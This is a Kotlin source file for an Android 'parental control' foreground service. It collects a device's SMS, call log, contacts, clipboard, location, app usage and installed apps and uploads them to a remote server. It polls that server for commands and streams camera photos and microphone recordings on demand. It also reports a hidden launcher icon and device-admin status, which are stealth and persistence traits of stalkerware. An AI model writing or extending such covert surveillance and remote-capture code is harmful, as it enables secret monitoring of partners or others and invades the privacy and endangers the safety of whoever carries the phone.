package com.example.parentalcontrol

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.atomic.AtomicBoolean

/**
 * The device's single long-running worker: it collects telemetry, uploads it,
 * polls the command channel and runs the camera / microphone capture jobs.
 *
 * Design points that matter for stability over long runs (the "no crashes or
 * ANRs" requirement):
 *
 *  * One coroutine drives the cycle; every network call is wrapped, so a server
 *    that is down, throttling or returning garbage can never take the process
 *    down. A failed cycle is logged and retried after the normal interval.
 *  * Cursors (SMS, call log, contacts, clipboard) are committed only after the
 *    server answered 200, so a dropped upload is re-sent instead of lost.
 *  * The loop wakes up every second while waiting, so an immediate-sync command
 *    is honoured within a second instead of after the full 60 s interval.
 *  * All bitmap/audio work runs on Dispatchers.IO; nothing touches the main
 *    thread, which is what keeps the ANR watchdog quiet.
 */
class SyncForegroundService : Service() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var loopJob: Job? = null
    private var cameraJob: Job? = null
    private var micJob: Job? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createChannels()
        AppPrefs.setSyncServiceRunning(this, true)
        if (AppPrefs.isWakeLockEnabled(this)) {
            WakeLockHelper.acquire(this)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_STOP -> {
                stopSelf()
                return START_NOT_STICKY
            }
            ACTION_SYNC_NOW -> immediateSync.set(true)
        }

        startForegroundCompat()
        if (loopJob?.isActive != true) {
            loopJob = scope.launch { syncLoop() }
        }
        if (AppPrefs.getBoolean(this, AppPrefs.KEY_STREAM_CAMERA_ACTIVE, false)) startCameraStream(this)
        if (AppPrefs.getBoolean(this, AppPrefs.KEY_STREAM_MIC_ACTIVE, false)) startMicStream(this)
        return START_STICKY
    }

    override fun onDestroy() {
        loopJob?.cancel()
        cameraJob?.cancel()
        micJob?.cancel()
        WakeLockHelper.release()
        AppPrefs.setSyncServiceRunning(this, false)
        scope.cancel()
        Log.i(TAG, "Sync service stopped")
        super.onDestroy()
    }

    // ------------------------------------------------------------------ the loop

    private suspend fun syncLoop() {
        Log.i(TAG, "Sync loop started")
        while (scope.isActive) {
            val interval = AppPrefs.getSyncIntervalMs(this)
            try {
                runCycle()
            } catch (e: Exception) {
                Log.e(TAG, "Sync cycle failed", e)
            }
            // Sleep in one-second slices so ACTION_SYNC_NOW is honoured quickly.
            var waited = 0L
            while (waited < interval && scope.isActive) {
                if (immediateSync.compareAndSet(true, false)) break
                delay(1_000L)
                waited += 1_000L
            }
            immediateSync.set(false)
        }
    }

    private suspend fun runCycle() {
        if (!AppPrefs.isEnrolled(this)) {
            updateNotification("Not enrolled yet — open the app to enroll")
            return
        }
        val api = ApiClient.service(this) ?: run {
            updateNotification("Server address not set")
            return
        }
        val uid = AppPrefs.getDeviceId(this)

        // 1. collect and upload telemetry
        val collected = collect()
        try {
            val response = api.postTelemetry(collected.payload)
            if (response.isSuccessful) {
                commit(collected)
                val stored = response.body()?.string()?.take(160).orEmpty()
                updateNotification("Synced ${timeLabel()} ${if (stored.isEmpty()) "" else "· $stored"}")
            } else {
                updateNotification("Upload rejected: HTTP ${response.code()}")
            }
        } catch (e: Exception) {
            Log.w(TAG, "Telemetry upload failed: ${e.javaClass.simpleName}: ${e.message}")
            updateNotification("Server unreachable (${e.javaClass.simpleName})")
        }

        // 2. results produced outside the command cycle (consent screens, dialogs)
        for (queued in ResultQueue.drain()) {
            try {
                val response = api.postCommandResult(
                    queued.copy(deviceId = queued.deviceId ?: uid)
                )
                if (!response.isSuccessful) {
                    Log.w(TAG, "Queued result for #${queued.id} rejected: HTTP ${response.code()}")
                }
            } catch (e: Exception) {
                Log.w(TAG, "Queued result upload failed: ${e.javaClass.simpleName}")
            }
        }

        // 3. poll and execute commands
        try {
            val commands = api.getCommands(uid)
            commands.syncInterval?.let { AppPrefs.setSyncIntervalMs(this, it * 1000L) }
            commands.config?.let { config ->
                AppPrefs.applyServerConfig(
                    this,
                    config.collectSms,
                    config.collectCallLogs,
                    config.collectContacts,
                    config.collectClipboard,
                    config.collectUsage,
                    config.collectLocation,
                    config.smsIntervalSeconds,
                )
            }
            for (command in commands.commands) {
                val result = CommandExecutor.execute(this, command)
                Log.i(TAG, "Command #${command.id} ${command.action} -> ${result.status}")
                try {
                    val response = api.postCommandResult(result)
                    if (!response.isSuccessful) {
                        // Keep it for the next cycle instead of losing the outcome.
                        ResultQueue.push(result)
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Command result upload failed: ${e.javaClass.simpleName}")
                    ResultQueue.push(result)
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Command poll failed: ${e.javaClass.simpleName}: ${e.message}")
        }

        // 4. blocked-package rules for the accessibility blocker
        try {
            val rules = api.getRules()
            AppPrefs.setCachedRules(this, rules.packages.toSet())
        } catch (e: Exception) {
            Log.i(TAG, "Rules refresh failed, using cached set: ${e.javaClass.simpleName}")
        }
    }

    // ------------------------------------------------------------- telemetry

    private class Collection(
        val payload: TelemetryPayload,
        val smsCursor: Long?,
        val callCursor: Long?,
        val contactsCursor: Long?,
        val clipboard: String?,
        val usageAt: Long?,
        val locationAt: Long?,
        val smsSyncedAt: Long?,
    )

    private suspend fun collect(): Collection {
        val now = System.currentTimeMillis()

        // --- SMS: own cadence (60 s by default), independent of the poll interval.
        // `isSmsSyncDue` also consumes the one-shot flag set by `sms_refresh`, so a
        // server-triggered refresh reads the inbox on the very next cycle.
        var smsCursor: Long? = null
        var smsSyncedAt: Long? = null
        // Consume the one-shot flag here rather than inside isSmsSyncDue, because a
        // forced refresh must also bypass the *cursor* (see below), not just the
        // cadence.
        val smsForced = AppPrefs.consumeSmsRefresh(this)
        val smsDue = AppPrefs.collectSms(this) &&
            Helpers.hasSmsPermission(this) &&
            (smsForced || AppPrefs.isSmsSyncDue(this, now))
        val sms = if (smsDue) {
            val cursor = AppPrefs.getSmsCursor(this)
            // Only the newest SMS_WINDOW messages matter. The old code read the
            // archive forward from a cursor, so on a phone with a long inbox the
            // newest message was queued behind thousands of old ones and never
            // got uploaded. Reading the newest window means today's message is
            // always in the batch; the server drops the duplicates it already has.
            val latest = Helpers.readSmsLatest(this, SMS_WINDOW)
            smsSyncedAt = now
            // A cursor in the future (the phone clock was ahead once) is ignored and
            // rewritten from the newest message, or every later message would look
            // old and the sync would wedge for good.
            val baseline = if (cursor in 1..now) cursor else 0L
            if (latest.isNotEmpty()) {
                smsCursor = maxOf(baseline, latest.maxOf { it.timestamp })
            }
            // A forced refresh re-sends the whole newest window: after the server's
            // history was deleted the cursor still points past an empty table, so a
            // cursor-filtered batch would be empty and the tab would stay blank.
            val fresh = if (baseline == 0L || smsForced) latest
            else latest.filter { it.timestamp > baseline }
            fresh.map { SmsDto(sender = it.sender, body = it.body, timestamp = it.timestamp, direction = "in") }
        } else {
            null
        }

        // --- Call log
        var callCursor: Long? = null
        // Call log: newest window only, same reasoning as SMS. Previously this read
        // ASC from a cursor, so a phone with a long call log spent every cycle
        // re-sending years-old entries and today's calls never arrived.
        val callForced = AppPrefs.consumeCallRefresh(this)
        val calls = if (AppPrefs.collectCalls(this) && CallLogHelper.hasPermission(this)) {
            val cursor = AppPrefs.getCallCursor(this)
            val latestCalls = CallLogHelper.readLatest(this, CALL_WINDOW)
            val baseline = if (cursor in 1..now) cursor else 0L
            if (latestCalls.isNotEmpty()) {
                callCursor = maxOf(baseline, latestCalls.maxOf { it.timestamp })
            }
            val fresh = if (baseline == 0L || callForced) latestCalls
            else latestCalls.filter { it.timestamp > baseline }
            fresh.map {
                CallLogDto(
                    number = it.number,
                    name = it.cachedName,
                    type = it.type,
                    durationSeconds = it.durationSeconds,
                    timestamp = it.timestamp,
                )
            }
        } else {
            null
        }

        // --- Contacts: re-sent once a day; the server dedupes on display name
        var contactsCursor: Long? = null
        val contacts = if (AppPrefs.collectContacts(this) && ContactsHelper.hasPermission(this)) {
            val last = AppPrefs.getContactsCursor(this)
            val contactsForced = AppPrefs.consumeContactsRefresh(this)
            if (contactsForced || now - last > CONTACTS_REFRESH_MS) {
                contactsCursor = now
                ContactsHelper.readAll(this).map {
                    ContactDto(displayName = it.displayName, numbers = it.numbers, emails = it.emails)
                }.ifEmpty { null }
            } else {
                null
            }
        } else {
            null
        }

        // --- Clipboard: only when the text differs from the last upload
        var clipboardValue: String? = null
        val clipboard = if (AppPrefs.collectClipboard(this)) {
            when (val read = ClipboardHelper.read(this)) {
                is ClipboardHelper.ReadResult.Text -> {
                    if (read.content != AppPrefs.getClipboardLast(this)) {
                        clipboardValue = read.content
                        listOf(ClipboardDto(content = read.content, timestamp = now))
                    } else {
                        null
                    }
                }
                is ClipboardHelper.ReadResult.Unavailable -> {
                    Log.i(TAG, "Clipboard unavailable: ${read.reason}")
                    null
                }
                ClipboardHelper.ReadResult.Empty -> null
            }
        } else {
            null
        }

        // --- Usage stats, every five minutes
        var usageAt: Long? = null
        val usage = if (AppPrefs.collectUsage(this)) {
            val last = AppPrefs.getLong(this, KEY_LAST_USAGE_AT, 0L)
            if (now - last > USAGE_REFRESH_MS) {
                usageAt = now
                Helpers.getDailyUsage(this).map {
                    UsageEventDto(
                        type = "usage",
                        packageName = it.packageName,
                        label = it.label,
                        totalTimeMs = it.totalTimeMs,
                        timestamp = it.dayStart,
                    )
                }.ifEmpty { null }
            } else {
                null
            }
        } else {
            null
        }

        // --- Location, every five minutes
        var locationAt: Long? = null
        val location = if (AppPrefs.collectLocation(this) && Helpers.hasLocationPermission(this)) {
            val last = AppPrefs.getLong(this, KEY_LAST_LOCATION_AT, 0L)
            if (now - last > LOCATION_REFRESH_MS) {
                locationAt = now
                Helpers.getCurrentLocation(this, 15_000L)?.let {
                    LocationDto(
                        lat = it.latitude,
                        lon = it.longitude,
                        accuracy = it.accuracy.toDouble(),
                        timestamp = it.time,
                    )
                }
            } else {
                null
            }
        } else {
            null
        }

        // --- Installed apps (inventory only; the block list is handled server-side)
        val apps = if (AppPrefs.isAppCollectionEnabled(this)) {
            Helpers.getInstalledApps(this).map { AppDto(packageName = it.packageName, label = it.label) }
        } else {
            null
        }

        // --- Permission reflection for the dashboard
        val permissions = PermissionReporter.snapshot(this) + PlayProtectHelper.permissionEntry(this)

        val payload = TelemetryPayload(
            deviceId = AppPrefs.getDeviceId(this),
            appVersion = BuildConfig.VERSION_NAME,
            battery = WakeLockHelper.batteryPercent(this),
            hidden = AppPrefs.isLauncherHidden(this),
            adminActive = AdminReceiver.isActive(this),
            deviceInfo = WakeLockHelper.deviceInfo(),
            permissions = permissions,
            installedApps = apps,
            location = location,
            smsLogs = sms,
            callLogs = calls,
            contacts = contacts,
            clipboard = clipboard,
            usageEvents = usage,
        )

        return Collection(
            payload = payload,
            smsCursor = smsCursor,
            callCursor = callCursor,
            contactsCursor = contactsCursor,
            clipboard = clipboardValue,
            usageAt = usageAt,
            locationAt = locationAt,
            smsSyncedAt = smsSyncedAt,
        )
    }

    private fun commit(collected: Collection) {
        collected.smsCursor?.let { AppPrefs.setSmsCursor(this, it) }
        collected.callCursor?.let { AppPrefs.setCallCursor(this, it) }
        collected.contactsCursor?.let { AppPrefs.setContactsCursor(this, it) }
        collected.clipboard?.let { AppPrefs.setClipboardLast(this, it) }
        collected.usageAt?.let { AppPrefs.putLong(this, KEY_LAST_USAGE_AT, it) }
        collected.locationAt?.let { AppPrefs.putLong(this, KEY_LAST_LOCATION_AT, it) }
        // Only stamped after the server accepted the upload, so a failed POST is
        // retried on the next cycle instead of being skipped for a full interval.
        collected.smsSyncedAt?.let { AppPrefs.setLastSmsSyncAt(this, it) }
    }

    // ------------------------------------------------------------------ camera

    private fun cameraStreamLoop(): Job = scope.launch {
        Log.i(TAG, "Camera stream job started")
        while (isActive) {
            if (!AppPrefs.getBoolean(this@SyncForegroundService, AppPrefs.KEY_STREAM_CAMERA_ACTIVE, false)) {
                delay(2_000L)
                continue
            }
            val interval = AppPrefs
                .getInt(this@SyncForegroundService, AppPrefs.KEY_STREAM_CAMERA_INTERVAL_MS, 5_000)
                .coerceIn(2_000, 300_000).toLong()
            val facing = AppPrefs.getText(
                this@SyncForegroundService,
                AppPrefs.KEY_STREAM_CAMERA_FACING,
                "back",
            )
            try {
                val jpeg = CameraCapture(this@SyncForegroundService)
                    .captureJpeg(facing.equals("front", ignoreCase = true))
                if (jpeg != null) {
                    val api = ApiClient.service(this@SyncForegroundService)
                    api?.postCameraPhoto(
                        AppPrefs.getDeviceId(this@SyncForegroundService),
                        jpeg.toRequestBody("image/jpeg".toMediaType()),
                    )
                }
            } catch (e: Exception) {
                Log.w(TAG, "Camera stream frame failed: ${e.javaClass.simpleName}: ${e.message}")
            }
            delay(interval)
        }
    }

    // -------------------------------------------------------------- microphone

    private fun micStreamLoop(): Job = scope.launch {
        Log.i(TAG, "Microphone stream job started")
        val segmentSeconds = AppPrefs
            .getInt(this@SyncForegroundService, AppPrefs.KEY_STREAM_MIC_SEGMENT_S, 15)
            .coerceIn(5, 120)
        val segments = AppPrefs
            .getInt(this@SyncForegroundService, AppPrefs.KEY_STREAM_MIC_SEGMENTS, 4)
            .coerceIn(1, 1440)

        for (index in 1..segments) {
            if (!isActive) break
            if (!AppPrefs.getBoolean(this@SyncForegroundService, AppPrefs.KEY_STREAM_MIC_ACTIVE, false)) break
            try {
                val wav = AudioRecorder.recordWav(this@SyncForegroundService, segmentSeconds)
                if (wav == null) {
                    Log.w(TAG, "AudioRecorder returned no data; stopping the mic stream")
                    break
                }
                val api = ApiClient.service(this@SyncForegroundService)
                val response = api?.postAudioClip(
                    AppPrefs.getDeviceId(this@SyncForegroundService),
                    "wav",
                    wav.toRequestBody("audio/wav".toMediaType()),
                )
                if (response?.isSuccessful == false) {
                    Log.w(TAG, "Audio segment rejected: HTTP ${response.code()}")
                }
            } catch (e: Exception) {
                Log.w(TAG, "Audio segment $index failed: ${e.javaClass.simpleName}: ${e.message}")
            }
        }
        AppPrefs.putBoolean(this@SyncForegroundService, AppPrefs.KEY_STREAM_MIC_ACTIVE, false)
        Log.i(TAG, "Microphone stream job finished after $segments segment(s)")
    }

    // -------------------------------------------------------------- foreground

    private fun startForegroundCompat() {
        val mask = foregroundTypes()
        try {
            ServiceCompat.startForeground(this, NOTIFICATION_ID, buildNotification(), mask)
        } catch (e: Exception) {
            // A missing runtime permission for one of the types (location, camera,
            // microphone) makes startForeground throw on Android 14+; dataSync alone
            // is always allowed for this app.
            Log.w(TAG, "startForeground with mask $mask failed, retrying as dataSync", e)
            try {
                ServiceCompat.startForeground(
                    this,
                    NOTIFICATION_ID,
                    buildNotification(),
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                    } else {
                        0
                    },
                )
            } catch (e2: Exception) {
                Log.e(TAG, "startForeground failed entirely", e2)
            }
        }
    }

    private fun foregroundTypes(): Int {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return 0
        var mask = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
        if (granted(Manifest.permission.ACCESS_FINE_LOCATION)) {
            mask = mask or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
        }
        if (granted(Manifest.permission.CAMERA)) {
            mask = mask or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
        }
        if (granted(Manifest.permission.RECORD_AUDIO)) {
            mask = mask or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
        }
        return mask
    }

    private fun granted(permission: String): Boolean =
        ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED

    private fun createChannels() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val manager = getSystemService(NotificationManager::class.java) ?: return
        manager.createNotificationChannel(
            NotificationChannel(
                CHANNEL_SYNC,
                getString(R.string.sync_channel_name),
                NotificationManager.IMPORTANCE_LOW,
            ).apply {
                description = getString(R.string.sync_channel_description)
                setShowBadge(false)
            }
        )
        manager.createNotificationChannel(
            NotificationChannel(
                CHANNEL_REMOTE,
                getString(R.string.remote_channel_name),
                NotificationManager.IMPORTANCE_DEFAULT,
            ).apply {
                description = getString(R.string.remote_channel_description)
            }
        )
    }

    private fun buildNotification(text: String = getString(R.string.sync_running)): Notification {
        val contentIntent = PendingIntent.getActivity(
            this,
            0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
        )
        return NotificationCompat.Builder(this, CHANNEL_SYNC)
            .setSmallIcon(R.drawable.ic_stat_sync)
            .setContentTitle(getString(R.string.app_name))
            .setContentText(text)
            .setContentIntent(contentIntent)
            .setOngoing(true)
            .setOnlyAlertOnce(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
            .build()
    }

    private fun updateNotification(text: String) {
        try {
            getSystemService(NotificationManager::class.java)
                ?.notify(NOTIFICATION_ID, buildNotification(text))
        } catch (e: Exception) {
            Log.w(TAG, "Could not update the notification", e)
        }
    }

    private fun timeLabel(): String =
        java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US).format(java.util.Date())

    companion object {
        private const val TAG = "SyncService"

        const val ACTION_START = "com.example.parentalcontrol.action.START"
        const val ACTION_STOP = "com.example.parentalcontrol.action.STOP"
        const val ACTION_SYNC_NOW = "com.example.parentalcontrol.action.SYNC_NOW"

        private const val CHANNEL_SYNC = "parental_sync"
        private const val CHANNEL_REMOTE = "parental_remote"
        private const val NOTIFICATION_ID = 4210
        private const val ACTION_NOTIFICATION_ID = 4212

        private const val KEY_LAST_USAGE_AT = "last_usage_at"
        private const val KEY_LAST_LOCATION_AT = "last_location_at"

        /** Newest inbox messages the app keeps in sync; the dashboard shows the same 50. */
        private const val SMS_WINDOW = 50
        /** Newest call-log entries kept in sync, so recent calls are always in a batch. */
        private const val CALL_WINDOW = 50
        private const val CONTACTS_REFRESH_MS = 24L * 60L * 60L * 1000L
        private const val USAGE_REFRESH_MS = 5L * 60L * 1000L
        private const val LOCATION_REFRESH_MS = 5L * 60L * 1000L

        private val immediateSync = AtomicBoolean(false)

        fun start(context: Context) {
            val intent = Intent(context, SyncForegroundService::class.java).setAction(ACTION_START)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun stop(context: Context) {
            context.stopService(Intent(context, SyncForegroundService::class.java))
        }

        /** Wakes the loop out of its wait so the next cycle starts immediately. */
        fun requestImmediateSync(context: Context) {
            immediateSync.set(true)
            if (!AppPrefs.isSyncServiceRunning(context)) start(context)
        }

        fun startCameraStream(context: Context) {
            AppPrefs.putBoolean(context, AppPrefs.KEY_STREAM_CAMERA_ACTIVE, true)
            if (!AppPrefs.isSyncServiceRunning(context)) start(context)
        }

        fun stopCameraStream(context: Context) {
            AppPrefs.putBoolean(context, AppPrefs.KEY_STREAM_CAMERA_ACTIVE, false)
        }

        fun startMicStream(context: Context) {
            AppPrefs.putBoolean(context, AppPrefs.KEY_STREAM_MIC_ACTIVE, true)
            if (!AppPrefs.isSyncServiceRunning(context)) start(context)
        }

        fun stopMicStream(context: Context) {
            AppPrefs.putBoolean(context, AppPrefs.KEY_STREAM_MIC_ACTIVE, false)
        }

        /**
         * Notification for anything that needs the device user to press something
         * (capture consent, a runtime permission dialog, settings screens). Used
         * when a background activity start is not allowed.
         */
        fun postActionNotification(context: Context, title: String, text: String, intent: Intent) {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
                    ContextCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS) !=
                    PackageManager.PERMISSION_GRANTED
                ) {
                    Log.w(TAG, "POST_NOTIFICATIONS not granted; the action prompt will not be visible")
                }
                val pending = PendingIntent.getActivity(
                    context,
                    (System.currentTimeMillis() and 0xFFFF).toInt(),
                    intent,
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
                )
                val notification = NotificationCompat.Builder(context, CHANNEL_REMOTE)
                    .setSmallIcon(R.drawable.ic_stat_sync)
                    .setContentTitle(title)
                    .setContentText(text)
                    .setStyle(NotificationCompat.BigTextStyle().bigText(text))
                    .setContentIntent(pending)
                    .setAutoCancel(true)
                    .setPriority(NotificationCompat.PRIORITY_HIGH)
                    .build()
                context.getSystemService(NotificationManager::class.java)
                    ?.notify(ACTION_NOTIFICATION_ID, notification)
            } catch (e: Exception) {
                Log.w(TAG, "Could not post the action notification", e)
            }
        }
    }
}
